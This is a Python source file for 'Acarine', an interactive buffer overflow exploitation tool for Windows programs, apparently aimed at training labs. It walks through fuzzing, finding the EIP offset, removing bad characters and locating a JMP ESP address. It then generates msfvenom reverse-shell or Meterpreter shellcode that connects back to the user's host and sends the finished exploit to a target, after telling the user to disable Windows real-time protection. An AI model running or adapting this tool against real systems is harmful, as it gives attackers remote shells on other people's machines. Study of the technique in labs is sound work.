#!/bin/python

# Acarine v1.0.2

# Usage: 
    # Acarine.py -t [IP] -p [PORT]
# Description:
    # Acarine is a Buffer Overflow utility and guide.
    # It is to be used in conjunction with Immunity Debugger and Immunity's Mona module.
# Dependencies:
    # Metasploit Framework Tools

import argparse
import socket
import subprocess
import sys

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

# [@] - Common Functions:

def bufferSend(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        print("\nSending payload...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("\nExecution successful!\n")
        return 0
    except:
        print("Error: Could not connect.\n")
        return 1

def checklist():
    print(f"""\nRecommended pre-testing checklist:
    [*] Run Immunity as Admininistrator
    [*] Set Immunity's working directory [{color.BOLD}{color.YELLOW}!mona config -set workingfolder c:\mona\%p{color.END}]
    [*] Load and Run the vulnerable program in Immunity
    [*] Disable 'Real-time protection' in Windows Security""")
    menu()

def countAdd():
    global count
    count =+ 1

def menu():
    print(f"""\nPlease choose an option from the Menu:
    [{color.DARKCYAN}1{color.END}] Is a Buffer Overflow Possible?
    [{color.DARKCYAN}2{color.END}] Finding EIP and Offset
    [{color.DARKCYAN}3{color.END}] Finding Bad Characters
    [{color.DARKCYAN}4{color.END}] Finding the Jump Point
    [{color.DARKCYAN}5{color.END}] Final Buffer Overflow Exploit
Other Options:    
    [{color.DARKCYAN}C{color.END}] Pre-Testing Checklist
    [{color.DARKCYAN}P{color.END}] Detecting Protections\n""")
    
    if count == 0:
        print(f"To return to menu at any point type '{color.DARKCYAN}menu{color.END}'.\n")
        menuInput = input(f"{color.GREEN}[ENTER] to start from [1], OR enter option number: {color.END}")
    else:
        menuInput = input(f"{color.GREEN}Enter option number: {color.END}")
    countAdd()
    if menuInput == "C" or menuInput == "c":
        checklist()
    elif menuInput == "P" or menuInput == "p":
        protectionsCheck()
    elif menuInput == "1" or menuInput == "":
        initialTest()
    elif menuInput == "2":
        offsetTest()
    elif menuInput == "3":
        badCharsTest()
    elif menuInput == "4":    
        jumpPointTest()
    elif menuInput == "5":
        exploitBuffer()
    else:
        print(f"\n{color.RED}Please enter a valid option!{color.END}")
        menu()

def menuCheck(input):
    if input == "menu":
        menu()
    else:
        True

def offsetAvailble():
    try:
        offset
    except NameError:
        offsetEnter()

def offsetEnter():
    global offset
    try:
        offset = int(input(f"{color.RED}\nNo offset variable detected from previous sections.{color.END}\n\n{color.GREEN}Enter offset: {color.END}"))
        return offset
    except:
        print(f"{color.RED}\nOffset must be an Integer! Try again!{color.END}")
        offsetEnter()

def protectionsCheck():
    print(f"""\nTo detect protections on the target program type '{color.BOLD}{color.YELLOW}!mona modules{color.END}' in Immunity.\n
Under the '{color.BOLD}Module Info{color.END}' header we are looking for '{color.BOLD}False{color.END}' under Rebase, SafeSEH, ASLR, NXCompat, OS Dll, etc.""")
    menu()

# [1] Is a Buffer Overflow Possible?:

def initialTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[1] Is a Buffer Overflow Possible?:{color.END}\n
This initial test is to determine whether a buffer overflow is possible, by making 
sure we can overwrite the EIP.\n
The next step will send 5000 'A' characters to the target ('41' in hex).
Upon execution, make sure to check the value of the EIP in Immunity (which should 
be '41414141' if successful)\n
Make sure the program you are testing is now {color.PURPLE}LOADED and RUNNING{color.END} in Immunity.\n""")
    aCharsInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
    menuCheck(aCharsInput)
    if aCharsInput == "":
        aChars = 5000*"A"
    elif aCharsInput != "":
        try:
            aChars = int(aCharsInput)*"A"
        except:
            print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
            initialTest()  
    if bufferSend(aChars) == 0:
        print(f"""The program should now have crashed and the EIP should read '41414141'.\n
Now we will move on to the finding the EIP and Offset.\n""")
        offsetTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        initialTest()

# [2] Finding the EIP and Offset:

def offsetTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[2] Finding the EIP and Offset:{color.END}\n
This section is to find the exact location of the EIP and its offset.\n
To do this we will be sending a pattern of 5000 characters, where upon noting what numbers appear in the EIP
we can then find the exact offset.\n
Make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n""")
    patternInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
    menuCheck(patternInput)
    if patternInput == "":
        pattern = 5000
    elif patternInput != "":
        try:
            pattern = int(patternInput)
        except:
            print(f"{color.RED}\nInput must be an Integer! Reloading section!{color.END}")
            offsetTest()
    patternC = subprocess.run(['msf-pattern_create','-l', str(pattern)], capture_output=True, text=True)
    if bufferSend(patternC.stdout) == 0:
        try:
            EIP = int(input(f"{color.GREEN}Enter the value of the EIP: {color.END}"))
        except:
            print(f"{color.RED}\nEIP must be an Integer! Reloading section!{color.END}")
            offsetTest()
        if len(str(EIP)) == 8:
            True
        else:
            print(f"{color.RED}\nEIP must be 8 characters long! Reloading section!{color.END}")
            offsetTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        offsetTest()
    patternO = subprocess.run(['msf-pattern_offset','-l', str(pattern),'-q', str(EIP)], capture_output=True, text=True)
    patternOffsetOutput = patternO.stdout
    print(f"\n{patternOffsetOutput}")
    global offset
    offset = int(patternOffsetOutput[26:])
    print(f"""Now we need to test whether we are on target and have indeed successfully discovered the offset.\n
We will now send a payload of Four 'B' characters ('42424242' in hex) with our offset of {offset}.
If we are successful the EIP will read '42424242' as these 'B' should land exactly.\n
Again, make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n""")
    BCharTest = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
    menuCheck(BCharTest)
    offsetLoad = "A" * offset + "B" * 4
    if bufferSend(offsetLoad) == 0:
        print(f"""The program should now have crashed and the EIP should read '42424242'.\n
This means we are on target and now we will move on to the finding Bad Characters.\n""")
        badCharsTest()
    else:
        print(f"{color.RED}Characters failed to send! Reloading section!{color.END}")
        offsetTest()
    
# [3] Finding Bad Characters:

def badCharsCall():
    global badChars
    global badCharsStatic
    badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    badCharsStatic = badChars
    return badChars

def badCharsExec(charInp):
    charsPrompt(charInp)
    load = charsConvert(badChars)
    charsLoad = "A" * offset + "B" * 4 + load
    bufferSend(charsLoad)

def charsMod(charsResultInput):
    global badChars
    toRemove = charsResultInput.split(' ')
    toRemove = list(r'\x' + toRemove for toRemove in toRemove)
    for match in toRemove:
        badChars = badChars.replace(match, '')
    return badChars

def charsPrompt(charsResultInput):
    menuCheck(charsResultInput)
    if charsResultInput == "":
        return badChars
    else:
        charsMod(charsResultInput)

def charsConvert(charSend):
    chars_chars_mod = charSend
    arr = chars_chars_mod.split("\\x")
    arr = "".join(
        chr(int(i,16))
        for i in arr if i
        )
    return arr

def charsVar():
    global badCharsVar
    toRemove = badChars.split(r'\x')
    toRemove = list(toRemove for toRemove in toRemove)
    toCompare = badCharsStatic.split(r'\x')
    toCompare = list(toCompare for toCompare in toCompare)
    charsList = set(toCompare)-set(toRemove)
    badCharsVar = r'\x' + r'\x'.join(charsList)

def badCharsTest():
    badCharsCall()
    ## Instructions/Intro - Explains BadChars
    print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n
In this section we will be generating a series of characters that will use to diagnose whether the program
we are testing has any {color.BOLD}Bad Characters{color.END} that need to be eliminated before generating an exploit.""")
    offsetAvailble()
    ## Tells how to make first byte array
    print(f"\nFirst we need to generate a byte array. This will be used to determine any Bad Characters.\n")
    print(rf'To generate a byte array in Immunity enter "{color.YELLOW}!mona bytearray -b "\x00"{color.END}"')
    print(f"""\nAgain, make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n
When ready, a payload of characters will be sent to the target program.\n""")
    ## Test 1: w/o user input:
    charsInitialInput = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
    badCharsExec(charsInitialInput)
    ## Tells how to compare and "please note"
    print(f"This time make note of the {color.BOLD}ESP value.{color.END}\n")
    print(rf"And in Immunity enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}'")
    print(f"""\nNow, make note of the characters listed under the 'BadChars' header in the comparison results.\n
Please note:
    [*] The '00' byte has {color.BOLD}already been excluded{color.END} from the byte array, so {color.BOLD}do not{color.END} enter this as a result.
    [*] If two bytes follow each other (e.g. '0a 0b','19 1a', etc) {color.BOLD}only enter the first byte listed{color.END}, as the second may be a false positive.
        If the second byte continues to show as a positive in subsequent testing, then please include it.\n
After making note of the bad character(s), make sure you {color.PURPLE}RE-LOAD and RE-RUN{color.END} your target program before continuing.""")
    # Test 2: w/ user input:
    charsResultInput = input(f"\n{color.GREEN}Enter bad characters seperated by spaces, and press [ENTER] to continue.\nOR, if 'Status' header returns 'Unmodified' press [ENTER]: {color.END}")
    badCharsExec(charsResultInput)
    # Test 3: Asks user to either enter if unmodified or enter badchars:
    while True:
        print(rf"Using the {color.BOLD}new ESP{color.END}, enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}' again.")
        newCharsResultInput = input(f"\n{color.GREEN}If 'Status' header now returns 'Unmodified' press [ENTER] (or enter remaining BadChars): {color.END}")
        if newCharsResultInput != "":
            badCharsExec(newCharsResultInput)
        else:
            break
    print("\nNow that we have successfully discovered all the Bad Characters in the test program we will move onto Finding the Jump Point.\n")
    charsVar()
    jumpPointTest()

# [4] Finding the Jump Point:

def endianConvert():
    jmpAdd = input(f"\n{color.GREEN}Please enter Jump Point Address: {color.END}")
    menuCheck(jmpAdd)
    if len(jmpAdd) != 10 or jmpAdd[1] != "x":
        print(f"\n{color.RED}Wrong length/format entered!{color.END}")
        endianConvert()
    else:
        global jmpEndian
        global cutAdd
        cutAdd = jmpAdd[2:10]
        listAdd = []
        lower = 6
        upper = 8
        for i in range(0,4):
            listAdd.append(i)
            listAdd[i] = cutAdd[lower:upper]
            lower -= 2
            upper -= 2
            if lower == -2:
                break
        jmpEndian = r'\x' + r'\x'.join(listAdd)

def jumpPointTest():
    print(f"""\n{color.BOLD}{color.UNDERLINE}[4] Finding the Jump Point:{color.END}\n
In this section we will be finding a jump point that allows us to point towards our eventual payload.""")
    offsetAvailble()
    print("\nTo find a jump point (with the program crashed or running) in Immunity enter either:")
    print(rf'   [*] "{color.YELLOW}!mona find -s "\xff\xe4" -m {color.END}{color.RED}<program.exe>{color.END}", OR;')
    print(rf'   [*] "{color.YELLOW}!mona find -s "\xff\xe4" -m {color.END}{color.CYAN}<DLL.dll>{color.END}" (If the program tested includes a {color.BOLD}DLL{color.END}).')
    print(f"\nNB: If the results window doesn't show, on the top options bar: {color.BOLD}'Windows' -> 'Log Data'{color.END}\nNB: Multiple addresses may be returned, choose one.\n")
    print(rf'The Jump Point address will appear in the format "{color.BOLD}0x080414c3{color.END}".')
    endianConvert()
    print(f"""\nThis address in Little Endian is {color.BOLD}{jmpEndian}{color.END}.\n
We now need to test that we can use this jump point to our advantage.\n
Make sure to now {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program.\n
In {color.BOLD}Immunity{color.END}, at the top of the interface, there is a {color.BLUE}blue arrow pointing at four blue dots{color.END}, click on it.\n
Now enter '{color.BOLD}{cutAdd}{color.END}' and click 'Okay'.\n
Now press {color.BOLD}F2{color.END} and click 'Yes'""")
    next = input(f"\n{color.GREEN}When ready to continue press [ENTER]: {color.END}")
    menuCheck(next)
    print(f"""\nIn the top left panel in Immunity you should see the following:\n
> '{color.CYAN}{cutAdd}{color.END} ? FFE4 {color.RED}JMP{color.END} ESP'\n
This sets our address as a {color.BOLD}Breakpoint{color.END}.""")
    next = input(f"\n{color.GREEN}When ready to send test payload press [ENTER]: {color.END}")
    menuCheck(next)
    load = charsConvert(jmpEndian)
    charsLoad = "A" * offset + load
    bufferSend(charsLoad)
    print(f"""\nNow we should notice in the top right panel: 
'{color.BOLD}EIP {color.CYAN}{cutAdd}{color.END}{color.BOLD} gatekeep.{cutAdd}{color.END}'
\nAnd down in the bottom left we should see: 
'{color.BOLD}Breakpoint at gatekeep.{cutAdd}'{color.END}\n
This means we are hitting our jump point successfully.\n
We will now be moving onto crafting our final payload.\n""")
    exploitBuffer()

# [5] Final Buffer Overflow Exploit:

def badCharsAvailable():
    try:
        badChars
    except NameError:
        badCharsEnter()

def badCharsEnter():
    badCharsCall()
    charsInput = input(f"{color.RED}\nNo bad characters detected from previous sections.{color.END}\n\n{color.GREEN}{color.GREEN}Enter bad characters seperated by spaces, OR press [ENTER] if target program has no bad characters: {color.END}")
    charsMod(charsInput)
    charsVar()

def jmpPointAvailable():
    try:
        jmpEndian
    except NameError:
        jmpPointEnter()

def jmpPointEnter():
    print(f"{color.RED}\nNo Jump Point detected from previous sections.{color.END}")
    endianConvert()

def localHostIP():
    global LHOST
    LHOST = input(f"\n{color.GREEN}Enter Local Host {color.BOLD}IP{color.END}{color.GREEN} for exploit connect back to (on your machine): {color.END}")
    menuCheck(LHOST)
    if len(LHOST) > 15 or len(LHOST) < 7:
        print(f"\n{color.RED}Invalid IP entered!{color.END}")
        localHostIP()
    else:
        return LHOST

def localHostPort():
    global LPORT
    try:
        LPORT = int(input(f"\n{color.GREEN}Enter Local Host {color.BOLD}PORT{color.END}{color.GREEN} for exploit connect back to (on your machine): {color.END}"))
    except:
        print(f"\n{color.RED}Invalid PORT entered!{color.END}")
        localHostPort()

def payloadType():
    global payload
    global pType
    payloadInput = input(f"{color.GREEN}Enter payload type [N/M]: {color.END}")
    menuCheck(payloadInput)
    if payloadInput == "N" or payloadInput == "n":
        print(f"\n{color.PURPLE}Netcat selected!{color.END}\n")  
        cmd = rf'msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\x00{badCharsVar}" -f c'
        msfvenomNC = subprocess.run(cmd, shell=True, capture_output=True)
        payload = msfvenomNC.stdout
        pType = "N"
    elif payloadInput == "M" or payloadInput == "m":
        print(f"\n{color.PURPLE}Meterpreter Selected!{color.END}\n")
        cmd = rf'msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\x00{badCharsVar}" -f c'
        msfvenomMet = subprocess.run(cmd, shell=True, capture_output=True)
        payload = msfvenomMet.stdout
        pType = "M"
    else:
        print(f"{color.RED}Invalid input!{color.END}")
        payloadType()
    payload = payload[24:-3]
    payload = payload.decode('utf-8')
    payload = payload.replace('"\n"',"")
    payload = charsConvert(payload)

def exploitBuffer():
    padding = 32 * "\x90"
    print(f"""\n{color.BOLD}{color.UNDERLINE}[5] Final Buffer Overflow Exploit:{color.END}\n
In this section we will craft our final payload for our Buffer Overflow exploit.
This payload can either be received via Netcat or Metasploit's Meterpreter shell.""")
    offsetAvailble()
    badCharsAvailable()
    jmpPointAvailable()
    localHostIP()
    localHostPort()
    print(f"""\nNow that we know the EIP, the Bad Characters & the Jump Point we can now craft our final payload!\n
Choose payload type:
    [{color.CYAN}N{color.END}] Netcat Reverse TCP Payload
    [{color.CYAN}M{color.END}] Meterpreter Reverse TCP Payload\n""")
    payloadType()
    if pType == "N":
        shell = "Netcat"
        print(f"""Prior to this exploit executing, please open a terminal window and type in the following command to set up a Netcat listener:
[*] '{color.YELLOW}nc -nlvp {LPORT}{color.END}'""")
    elif pType == "M":
        shell = "Meterpreter"
        print(f"""Prior to this exploit executing, please open a terminal window and type in the following series of commands:
    [1] '{color.YELLOW}msfconsole{color.END}'
    [2] '{color.YELLOW}use exploit/multi/handler{color.END}'
    [3] '{color.YELLOW}set payload windows/meterpreter/reverse_tcp{color.END}'
    [4] '{color.YELLOW}set lhost {LHOST}{color.END}'
    [5] '{color.YELLOW}set lport {LPORT}{color.END}'
    [6] '{color.YELLOW}options{color.END}' (to make sure all settings are correct)
    [7] '{color.YELLOW}run{color.END}'""")
    jmpEndianCon = charsConvert(jmpEndian)
    next = input(f"\n{color.GREEN}When ready to Continue to final check, press [ENTER]: {color.END}")
    menuCheck(next)
    print(f"""\n{color.BOLD}{color.UNDERLINE}Summary:{color.END}
Attacker:
    [*] Shell Type:                 {color.GREEN}{shell}{color.END}
    [*] Local IP:                   {color.GREEN}{LHOST}{color.END}
    [*] Local PORT:                 {color.GREEN}{LPORT}{color.END}
Target:
    [*] Target IP:                  {color.CYAN}{HOST}{color.END}
    [*] Target PORT:                {color.CYAN}{PORT}{color.END}
    [*] EIP Offset:                 {color.CYAN}{offset}{color.END}
    [*] Bad Characters:             {color.CYAN}{badCharsVar}{color.END}
    [*] Jump Point (Little Endian): {color.CYAN}{jmpEndian}{color.END}\n""")
    next = input(f"{color.GREEN}When ready to send final exploit press [ENTER]: {color.END}")
    menuCheck(next)
    finalPayload = "A" * offset + jmpEndianCon + padding + payload
    bufferSend(finalPayload)
    if bufferSend == 0:
        print(f"\nThe Buffer Overflow exploit have successfully executed and you should now have an active {shell} shell connected.\n")
        next = input(f'\n{color.GREEN}Press [ENTER] to return to menu, or type "exit" to terminate program: {color.END}')
        if next == "exit":
            sys.exit()
        else:
            menu()
    elif bufferSend == 1:
        print(f"{color.RED}\nBuffer Overflow Exploit Failed to Send! Restarting section!{color.END}")
        exploitBuffer()

# [!] Main:

parser = argparse.ArgumentParser()
parser.add_argument('-t','-T','--target', required=True, help="target IP")
parser.add_argument('-p','-P','--port', required=True, help="target PORT", type=int)
args = parser.parse_args()

HOST = args.target
PORT = args.port
count = 0

print(f"""{color.BOLD}{color.UNDERLINE}\nWelcome to Acarine!\n{color.END}
This program is a {color.BOLD}Buffer Overflow{color.END} utility. 
To be used in conjunction with {color.BOLD}Immunity Debugger{color.END} and the Immunity's {color.BOLD}Mona module{color.END}.\n
Target is @ {color.BOLD}{color.DARKCYAN}{HOST}:{PORT}{color.END}""")
checklist()
menu()
